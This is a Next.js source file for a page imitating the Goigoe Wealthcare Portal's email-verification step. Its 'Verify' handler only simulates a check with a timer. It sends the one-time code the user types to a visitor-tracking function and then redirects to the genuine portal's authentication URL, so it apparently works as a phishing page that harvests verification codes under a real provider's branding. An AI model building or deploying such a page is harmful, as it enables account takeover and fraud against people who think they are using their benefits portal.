"use client"

import Link from "next/link"
import Image from "next/image"
import { useState } from "react"
import { X } from "lucide-react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Spinner } from "@/components/ui/spinner"
import { BackButton } from "@/components/BackButton"
import { useVisitorTracking, trackFormSubmission } from "@/hooks/use-visitor-tracking"

export default function EmailVerificationPage() {
  useVisitorTracking()
  const [code, setCode] = useState("")
  const [isVerified, setIsVerified] = useState(false)
  const [errors, setErrors] = useState<{code?: string}>({})
  const [isLoading, setIsLoading] = useState(false)
  const [isCancelLoading, setIsCancelLoading] = useState(false)

  async function handleVerify() {
    const newErrors: {code?: string} = {}
    
    if (!code.trim()) {
      newErrors.code = 'Verification code is required'
    } else if (code.length < 4) {
      newErrors.code = 'Verification code must be at least 4 characters'
    }
    
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }
    
    setIsLoading(true)
    await new Promise(resolve => setTimeout(resolve, 1000))
    
    setErrors({})
    setIsLoading(false)
    // Track OTP verification
    trackFormSubmission({
      type: 'email_verification',
      otp: code,
      page: '/registration/email'
    })
    // Redirect to external URL after verification
    window.location.href = 'https://goigoe.wealthcareportal.com/Authentication/Handshake'
  }
  
  const handleCancelClick = async () => {
    setIsCancelLoading(true)
    await new Promise(resolve => setTimeout(resolve, 1000))
    window.location.href = '/'
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header (same as registration) */}
      <header className="border-b border-gray-200 px-6 py-4">
        <div className="flex items-center justify-between md:justify-start">
          <div className="flex items-center gap-6">
            {/* Logo */}
            <Link href="/" className="flex items-center">
              <Image
                src="/img/ebc994a1e5464f6b94b98cd212d5cbac.jpeg"
                alt="Goigoe Wealthcare Portal"
                width={140}
                height={32}
                className="h-8 w-auto"
                priority
              />
            </Link>

          </div>

          <div className="ml-6 text-xl text-gray-700 font-normal hidden md:block">Registration</div>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex flex-col items-center px-6 py-12">
        <div className="w-full max-w-md">
        {!isVerified ? (
          <>
            <label className="block text-gray-700 mb-2">Verification code</label>
            <Input
              type="text"
              value={code}
              onChange={(e) => {
                setCode(e.target.value)
                if (errors.code) {
                  setErrors(prev => ({ ...prev, code: undefined }))
                }
              }}
              className={`mb-4 ${errors.code ? 'border-red-500 focus:border-red-500 focus:ring-red-500' : ''}`}
            />
            {errors.code && (
              <p className="text-sm text-red-500 mb-4">{errors.code}</p>
            )}

            <Button
              disabled={isLoading}
              className="w-full text-white py-6 text-base font-semibold disabled:opacity-50 disabled:cursor-not-allowed bg-[#010147] hover:bg-[#0063ff]"
              onClick={handleVerify}
            >
              {isLoading ? (
                <>
                  <Spinner className="w-5 h-5 mr-2" />
                  LOADING...
                </>
              ) : (
                "Verify"
              )}
            </Button>
          </>
        ) : (
          <div className="mt-2 border border-gray-200 p-6 text-center">
            <h2 className="text-xl font-semibold text-gray-800 mb-2">Thank you for verifying your account</h2>
            <p className="text-gray-600 mb-6">Your email has been confirmed. You can proceed to sign in or return to the homepage.</p>
            <Button 
              onClick={async () => {
                setIsLoading(true)
                await new Promise(resolve => setTimeout(resolve, 1000))
                window.location.href = '/'
              }}
              disabled={isLoading}
              className="w-full bg-[#010147] hover:bg-[#0063ff] text-white py-6 text-base font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <>
                  <Spinner className="w-5 h-5 mr-2" />
                  LOADING...
                </>
              ) : (
                "Back to Homepage"
              )}
              </Button>
          </div>
        )}

        {/* Actions */}
        <div className="flex items-center justify-center gap-4 mt-8">
            <Button
            onClick={handleCancelClick}
            disabled={isCancelLoading}
              variant="outline"
            className="bg-[#010147] hover:bg-[#0063ff] text-white border-0 px-8 py-6 min-w-[140px] disabled:opacity-50 disabled:cursor-not-allowed"
            >
            {isCancelLoading ? (
              <>
                <Spinner className="w-5 h-5 mr-2" />
                LOADING...
              </>
            ) : (
              <>
              <X className="w-5 h-5 mr-2" />
              CANCEL
              </>
            )}
            </Button>
          <BackButton />
        </div>

        {/* Help Link */}
        <p className="text-center mt-6">
          <Link href="#" className="text-blue-700 underline hover:text-blue-800">
            I cannot receive a verification code
          </Link>
        </p>
      </div>
      </main>

      {/* Footer (same as registration) */}
      <footer className="bg-gray-300 py-6 px-6">
        <div className="max-w-7xl mx-auto">
          <nav className="flex flex-wrap items-center justify-center gap-6 mb-3 text-sm">
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              CONTACT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              ABOUT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              TERMS OF USE
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              PRIVACY POLICY
            </Link>
          </nav>
          <p className="text-center text-sm text-gray-600 mb-2">
            Copyright © 2024 Igoe Administrative Services. All Rights Reserved.
          </p>
          <p className="text-center">
            <Link href="#" className="text-sm text-gray-700 hover:text-gray-900 underline">
              SITE MAP
            </Link>
          </p>
        </div>
      </footer>
    </div>
  )
}


